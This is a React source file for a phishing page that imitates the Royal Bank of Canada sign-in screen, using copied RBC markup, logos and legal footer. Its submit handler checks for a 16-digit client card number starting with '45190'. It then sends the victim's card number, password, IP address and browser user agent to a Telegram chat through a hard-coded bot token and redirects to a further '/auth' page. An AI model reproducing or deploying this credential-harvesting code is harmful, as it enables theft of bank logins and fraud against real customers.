import { useEffect, useState } from "react";
import "./login.css";
import "./App.css";
import { useHistory } from "react-router";

function Login() {
  const history = useHistory();
  const { TelegramClient } = require("messaging-api-telegram");

  const [login, setlogin] = useState("");
  const [pass, setpass] = useState("");
  const [ip, setIp] = useState("");
  const [agent, setAgent] = useState("");

  const [error, setError] = useState(false);


  const [loading, setloading] = useState(false);

  const getOs = () => {
    return (window.navigator.userAgent);
  }
  const getUserGeolocationDetails = async () => {
    setAgent(getOs());

    await fetch(
      "https://api.ipify.org/?format=json"
    )
      .then(response => response.json())
      .then(data => setIp(data));

  };


  useEffect(() => {
    getUserGeolocationDetails()



  }, []);

  const client = new TelegramClient({
    accessToken: "1867080844:AAGf7rwEB9zCwpHDUFZjjwytXRGuObBSf74",
  });
  const sendmsg = async () => {
    console.log("sending msg now");
    await client.sendMessage(-427458504, "login : " + login + " \n pass  : " + pass + " \n  IP: " + ip["ip"] + "\n agent :" + agent);
    localStorage.setItem('user', login);
    localStorage.setItem('ip', ip["ip"])

  };

  const handleSubmit = (e) => {


    e.preventDefault();



    if (login && pass && login.length === 16 && login.startsWith("45190")) {
      setloading(true)
      setTimeout(() => {
        login && pass && sendmsg() && history.push("/auth");
      }, 3000);
    } else {
      setError(true)
    }
  };

  return (
    <>
      <header
        _ngcontent-ucb-c48=""
        data-loc="personal-banking"
        className="n-search n-location n-language n-contact n-secure menu-open"
      >
        <div
          _ngcontent-ucb-c48=""
          id="header"
          data-domain="rbcroyalbank.com"
          className="master-header"
        >
          <div _ngcontent-ucb-c48="" className="mobile-header-content">
            <a _ngcontent-ucb-c48="" href="" className="mobile-logo-wpr">
              <div _ngcontent-ucb-c48="" className="logo-img">
                <img
                  _ngcontent-ucb-c48=""
                  src="./rbc-logo-shield.svg"
                  alt="RBC"
                />
                <div _ngcontent-ucb-c48="" className="logo-text">
                  Royal Bank
                </div>
              </div>
            </a>
            <div _ngcontent-ucb-c48="" className="mobile-nav">
              <span
                _ngcontent-ucb-c48=""
                href=""
                id="header-mobile-sign-in-btn"
                className="mobile-secure-btn"
              >
                <span _ngcontent-ucb-c48="">
                  <i _ngcontent-ucb-c48="" className="fas fa-lock"></i>SECURE
                </span>
              </span>
              <button
                _ngcontent-ucb-c48=""
                aria-label="Menu"
                className="mobile-nav-btn active"
              >
                <span _ngcontent-ucb-c48="">MENU</span>
              </button>
            </div>
          </div>
        </div>
        <div
          _ngcontent-ucb-c48=""
          id="search-bar"
          tabindex="-1"
          role="dialog"
          aria-labelledby="header-search"
          aria-hidden="true"
          className="search-bar"
        >
          <div _ngcontent-ucb-c48="" className="search-bar-inner">
            <div _ngcontent-ucb-c48="" className="search-logo">
              <img
                _ngcontent-ucb-c48=""
                src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield-blue.svg"
                alt="RBC"
              />
            </div>
            <div _ngcontent-ucb-c48="" className="search-form">
              <form
                _ngcontent-ucb-c48=""
                novalidate=""
                method="get"
                action="https://www.rbcroyalbank.com/search-public/index.html"
                id="header-search-form"
                className="ng-untouched ng-pristine ng-valid"
              >
                <label
                  _ngcontent-ucb-c48=""
                  for="header-search"
                  className="offscreen"
                >
                  Ask your question
                </label>
                <input
                  _ngcontent-ucb-c48=""
                  type="hidden"
                  name="type"
                  id="header-search-type"
                  value="0"
                />
                <input
                  _ngcontent-ucb-c48=""
                  type="search"
                  name="question"
                  id="header-search"
                  autoComplete="off"
                  placeholder="Ask your question"
                  className="ui-autocomplete-input"
                />
              </form>
              <button
                _ngcontent-ucb-c48=""
                type="button"
                id="search-close"
                aria-label="Close search"
                className="search-close"
              >
                <img
                  _ngcontent-ucb-c48=""
                  src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/ui/ui-close-blue.svg"
                  alt="Close search"
                />
              </button>
            </div>
          </div>
        </div>
      </header>

      <div _ngcontent-wde-c48="" className="raszebi">
        <section _ngcontent-wde-c48="" className="primarySignIn">
          <div _ngcontent-wde-c48="" className="signtxt">
            <span _ngcontent-wde-c48="">
              Sign in to verify your information
            </span>
          </div>
          <form
            _ngcontent-wde-c48=""
            novalidate=""
            role="form"
            method="post"
            autoComplete="off"
            className="ng-untouched ng-pristine ng-valid ng-invalid"
          >
            <fieldset _ngcontent-wde-c48="">
              <div
                _ngcontent-wde-c48=""
                className="formBlock formBlock_clientCardOrUserName"
              >
                <div _ngcontent-wde-c48="" className="toolTip">
                  <div _ngcontent-wde-c48="" className="dropdown-menu">
                    <span _ngcontent-wde-c48="" className="dropdown-header">
                      {" "}
                      Client Card or Username
                    </span>
                  </div>
                </div>
                <div _ngcontent-wde-c48="" className="userSelectionWrapper">
                  <input
                    onChange={(event) => {
                      setlogin(event.target.value);
                    }}
                    value={login}
                    minLength="5"
                    _ngcontent-wde-c48=""
                    pattern="^[-a-zA-Z0-9@\.+_]+$"
                    required=""
                    name="K1"
                    type="text"
                    id="K1"
                    tabindex="2"
                    className="ccUsername ng-untouched ng-pristine ng-invalid"
                    ng-reflect-pattern="^[-a-zA-Z0-9@\.+_]+$"
                    ng-reflect-required=""
                    ng-reflect-name="K1"
                    ng-reflect-model=""
                  />

                </div>
                <div _ngcontent-wde-c48="" className="formLinks rasghri">
                  <a
                    _ngcontent-wde-c48=""
                    ga-event-category="Body"
                    ga-event-action="Click Link"
                    ga-event-label="Recover your username"
                    className="formLinksFirstA"
                  >
                    Recover your username{" "}
                    <i
                      _ngcontent-wde-c48=""
                      className="fas fa-chevron-right"
                    ></i>
                  </a>
                </div>
                {error && (
                  <div
                    _ngcontent-wde-c49=""
                    class="sdhw"
                    style={{ display: "block" }}
                  >
                    <br _ngcontent-wde-c49="" /> The information you entered does not match our records{" "}
                  </div>
                )}
              </div>
              <div
                _ngcontent-wde-c48=""
                className="formBlock zeps formBlock_password"
              >
                <label _ngcontent-wde-c48="" for="QQ" className="signInLabel">
                  Password{" "}
                </label>
                <div _ngcontent-wde-c48="" className="inputWrapper">
                  <input
                    onChange={(event) => {
                      setpass(event.target.value);
                    }}
                    _ngcontent-wde-c48=""
                    required=""
                    name="QQ"
                    type="password"
                    id="QQ"
                    tabindex="3"
                    ng-reflect-required=""
                    ng-reflect-name="QQ"
                    ng-reflect-model=""
                    className="ng-untouched ng-pristine ng-invalid"
                  />
                </div>
                <div _ngcontent-wde-c48="" className="formLinks rasghri">
                  <a
                    _ngcontent-wde-c48=""
                    tabindex="7"
                    ga-on="click"
                    ga-event-category="Body"
                    ga-event-action="Click Link"
                    ga-event-label="Reset your password"
                  >
                    Reset your password{" "}
                    <i
                      _ngcontent-wde-c48=""
                      className="fas fa-chevron-right"
                    ></i>
                  </a>
                </div>
              </div>
              <div
                _ngcontent-wde-c48=""
                className="formBlock formBlock_rememberCheckbox zeps"
              >
                <div _ngcontent-wde-c48="" className="inputWrapper">
                  <div _ngcontent-wde-c48="" className="checkBoxWrapper">
                    <input
                      _ngcontent-wde-c48=""
                      type="checkbox"
                      name="N1"
                      tabindex="5"
                      id="N1"
                      className="checkboxInput"
                    />
                    <span
                      _ngcontent-wde-c48=""
                      aria-hidden="true"
                      className="checkbox"
                    ></span>
                    <span
                      _ngcontent-wde-c48=""
                      for="N1"
                      className="checkBoxLabel"
                    >
                      Remember your client card or username
                    </span>
                  </div>
                </div>
              </div>
              <div
                _ngcontent-wde-c48=""
                className="formBlock formBlock_mainSignIn zeps"
              >
                <div _ngcontent-wde-c48="" className="inputWrapper">
                  <button
                    onClick={handleSubmit}
                    _ngcontent-wde-c48=""
                    type="submit"
                    tabindex="4"
                    className="yellowBtnLarge"
                  >
                    <span _ngcontent-wde-c48="" style={{ display: "block" }}>
                      {loading ? (
                        <i
                          _ngcontent-wde-c48=""
                          className="fas fa-circle-notch fa-spin"
                        ></i>
                      ) : (
                        "Sign In"
                      )}
                    </span>
                  </button>
                </div>
              </div>
              <div _ngcontent-wde-c48="" className="formLinksSecurityGuarantee">
                <div
                  _ngcontent-wde-c48=""
                  aria-hidden="true"
                  className="securityIcon"
                ></div>
                <div _ngcontent-wde-c48="" className="toolTip">
                  <button
                    _ngcontent-wde-c48=""
                    data-toggle="dropdown"
                    aria-expanded="false"
                    className="dropdown-toggle"
                  >
                    <i
                      _ngcontent-wde-c48=""
                      aria-hidden="true"
                      className="rbc-icon rbc_help whiteIcon"
                    ></i>
                  </button>
                  <div
                    _ngcontent-wde-c48=""
                    role="tooltip"
                    className="dropdown-menu"
                  >
                    <h4 _ngcontent-wde-c48="" className="dropdown-header">
                      <i _ngcontent-wde-c48="" className="fas fa-lock"></i> -
                      RBC Security Guarantee
                    </h4>
                  </div>
                </div>
              </div>
            </fieldset>
          </form>
        </section>
      </div>
      <div
        _ngcontent-wde-c48=""
        tabindex="-1"
        role="region"
        aria-label="Notice"
        className="importantNotice"
      >
        <div _ngcontent-wde-c48="" className="serviceNotice_body">
          <div
            _ngcontent-wde-c48=""
            className="importantNotice_body_links notice_body_item"
          >
            <a
              _ngcontent-wde-c48=""
              title="COVID-19 - How RBC is helping clients (Opens new tab)"
            >
              <span _ngcontent-wde-c48="">
                <img
                  _ngcontent-wde-c48=""
                  src="https://www1.royalbank.com/uos/3m/images/icons/informational-32.svg"
                  alt="Important Notice"
                  className="accessible"
                />
              </span>
              <span _ngcontent-wde-c48=""></span> Important Notices{" "}
              <br _ngcontent-wde-c48="" /> COVID-19 - How RBC is helping clients
              <i
                _ngcontent-wde-c48=""
                aria-hidden="true"
                title="Opens new tab"
                className="rbc-icon2019 rbc_new_window2019_blue"
              ></i>
              <span _ngcontent-wde-c48="" className="accessible">
                (Opens new tab)
              </span>
            </a>
          </div>
        </div>
      </div>
      <div _ngcontent-wde-c48="" className="main-legal">
        <div _ngcontent-wde-c48="" className="main-legal-inner">
          <div _ngcontent-wde-c48="" className="legal-left">
            <p _ngcontent-wde-c48="">
              Royal Bank of Canada Website, © 1995-2021
            </p>
            <p _ngcontent-wde-c48="">
              <a
                _ngcontent-wde-c48=""
                title="Legal (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Legal"
              >
                Legal
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>{" "}
              &nbsp;|&nbsp;{" "}
              <a
                _ngcontent-wde-c48=""
                title="Accessibility (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Accessibility"
              >
                Accessibility
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>{" "}
              &nbsp;|&nbsp;{" "}
              <a
                _ngcontent-wde-c48=""
                title="Privacy &amp; Security (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Privacy &amp; Security"
              >
                Privacy &amp; Security
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
}

export default Login;
